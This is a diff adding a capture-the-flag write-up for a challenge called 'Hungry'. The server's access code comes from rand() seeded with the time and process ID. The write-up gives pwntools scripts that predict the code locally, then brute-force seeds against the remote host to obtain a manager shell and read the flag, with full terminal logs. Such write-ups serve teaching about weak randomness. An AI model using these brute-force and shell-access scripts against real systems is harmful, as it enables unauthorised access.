@@ -146,3 +146,260 @@ nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}
 ## notes
 i hate owning a mac cause everytime i either have to do some stunts in vm or docker to test run the scripts
 its really irritating
+
+# Hungry
+- generated the pseudocode in ida
+- the server generates a number with rand() and seeds it using time()
+- this means the code that server expects is basically rand() called once with seed equal to the current unix timestamp
+so my idea was:
+- get the current timestamp from my machine (local time)
+- try a small range around that value
+- generate a random number with each possible seed
+- send that number to the server
+- check if it returns a flag
+- the reason to try around the timestamp is because sometimes the server time and my laptop time can be off by a few seconds.
+
+## how i figured out the code generation
+the chalenge uses a logic like this
+```
+srand(time(NULL));
+printf("%d\n", rand() % 1000000);
+```
+so all i need to do is:
+- loop over possible seeds near the current time
+- use python’s random.seed(seed) and random.randint(0,999999) to recreate the possible outputs
+First i made a script and solved it locally
+```
+from pwn import *
+import ctypes
+import time
+
+context.binary = "./burgers_are_mid"
+BIN = "./burgers_are_mid"
+
+libc = ctypes.CDLL("libc.so.6")
+
+def main():
+    p = process(BIN)
+    log.info(f"spawned burgers_are_mid with pid = {p.pid}")
+    p.recvuntil(b"(y/n)? ")
+    p.sendline(b"$")
+    t_now = libc.time(None)
+    log.info(f"our libc time() = {t_now}")
+    p.recvuntil(b"Enter manager access code:")
+    seed = t_now ^ p.pid
+    libc.srand(seed)
+    code = libc.rand() % 1000000
+
+    log.success(f"predicted code = {code}")
+    p.sendline(str(code).encode())
+    resp = p.recvline(timeout=1)
+    log.info(f"response: {repr(resp)}")
+
+    if b"Access granted" not in (resp or b""):
+        log.warning("did not see 'Access granted' (maybe lost the 1-second race?), try running again")
+        p.close()
+        return
+
+    log.success("we have manager shell, grabbing flag...")
+    for name in [b"flag", b"flag.txt", b"/flag", b"/home/ctf/flag", b"/home/ctf/flag.txt"]:
+        p.sendline(b"cat " + name)
+        out = p.recvline(timeout=0.5)
+        if out:
+            print(f"[flag attempt {name.decode(errors='ignore')}] {out.decode(errors='ignore').strip()}")
+    p.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+it gave the fake flag
+```
+root@e0cfced4cdac:/work# python3 illfinallysleep.py
+[*] '/work/burgers_are_mid'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[+] Starting local process './burgers_are_mid': pid 12
+[*] spawned burgers_are_mid with pid = 12
+[*] our libc time() = 1765002210
+[+] predicted code = 128525
+[*] response: b' Access granted, starting management interface.\n'
+[+] we have manager shell, grabbing flag...
+[flag attempt flag] cat: flag: No such file or directory
+[flag attempt flag.txt] nite{fake_flag}
+[flag attempt /flag] cat: /flag: No such file or directory
+[flag attempt /home/ctf/flag] cat: /home/ctf/flag: No such file or directory
+[flag attempt /home/ctf/flag.txt] cat: /home/ctf/flag.txt: No such file or directory
+[*] Switching to interactive mode
+$  
+```
+then i modified the script to use the netcat
+```
+
+from pwn import *
+import ctypes
+import time
+
+HOST = "hunger.nitephase.live"
+PORT = 53791
+
+libc = ctypes.CDLL("libc.so.6")
+
+def try_seed(seed):
+    """
+    given a seed, compute code and try it once against remote
+    """
+    libc.srand(seed)
+    code = libc.rand() % 1000000
+
+    log.info(f"trying seed={seed} code={code}")
+
+    try:
+        io = remote(HOST, PORT)
+    except Exception as e:
+        log.warning(f"connect failed: {e}")
+        return False
+
+    try:
+        io.recvuntil(b"(y/n)? ")
+        io.sendline(b"$")
+        io.recvuntil(b"Enter manager access code:")
+        io.sendline(str(code).encode())
+
+        resp = io.recvline(timeout=0.5) or b""
+        if b"Access granted" in resp:
+            log.success(f"SUCCESS with seed={seed}, code={code}")
+            io.sendline(b"cat flag.txt")
+            print(io.recvline(timeout=1).decode(errors="ignore").strip())
+            io.interactive()
+            return True
+    except EOFError:
+        pass
+    except Exception as e:
+        log.warning(f"error during attempt: {e}")
+
+    io.close()
+    return False
+
+def main():
+    base_time = int(time.time())
+    log.info(f"local time() = {base_time}")
+    time_window = range(-5, 6)     # base_time-5 .. base_time+5
+    pid_range   = range(1, 4096)   # sane PID range
+
+    for dt in time_window:
+        t = base_time + dt
+        for pid in pid_range:
+            seed = t ^ pid
+            if try_seed(seed):
+                return
+
+    log.error("exhausted search window, try running again (time drift?)")
+
+if __name__ == "__main__":
+    main()
+```
+```
+┌──(shaggy㉿kali)-[~/Desktop/src]
+└─$ python3 illfinallysleep.py
+[*] local time() = 1765003410
+[*] trying seed=1765003404 code=937923
+[◢] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003407 code=869472
+[◐] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003406 code=571361
+[◐] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003401 code=974899
+[←] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003400 code=308655
+[▁] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003403 code=791975
+[q] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003402 code=195901
+[<] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003397 code=496229
+[|] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003396 code=491117
+[▁] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003399 code=847843
+[▁] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003398 code=962606
+[.] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003393 code=567394
+[◢] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003392 code=454839
+[▖] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003395 code=528554
+[.] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003394 code=452264
+[.] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003421 code=856313
+[q] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003420 code=554617
+[┤] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003423 code=266014
+[/.......] Opening connection to hunger.nitephase.live on port 53791: Trying 20.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003422 code=149516
+[.] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003417 code=845165
+[◢] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003416 code=60978
+[◢] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003419 code=345374
+[▖] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[*] Closed connection to hunger.nitephase.live port 53791
+[*] trying seed=1765003418 code=376422
+[q] Opening connection to hunger.nitephase.live on port 53791: Trying 20.184.53.[+] Opening connection to hunger.nitephase.live on port 53791: Done
+[+] SUCCESS with seed=1765003418, code=376422
+nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}
+[*] Switching to interactive mode
+$ 
+[*] Interrupted
+[*] Closed connection to hunger.nitephase.live port 53791
+                                                                                
+┌──(shaggy㉿kali)-[~/Desktop/src]
+└─$ 
+
+```
+why i decided to solve like this:
+rand() is deterministic. once you know the seed, you know the output. using time() as a seed is very common but very weak because you can predict time.
+if the server did something like:
+seed once at startup
+generate multiple randoms
+then it would be harder because the offset grows.
+but here it was clearly:
+seed every connection
+only one number generated
+so brute forcing the seed around current time was the easiest method.
+##final flag
+``nite{s1ndh1_15_m0r3_f1ll1ng_th4n_bk_or_mcd}``
+## notes
+i hate switching between macos, docker and the kali vm
+and even if that wasnt enough, theres extra bs with x86 binaries and arm 
+i hate my life
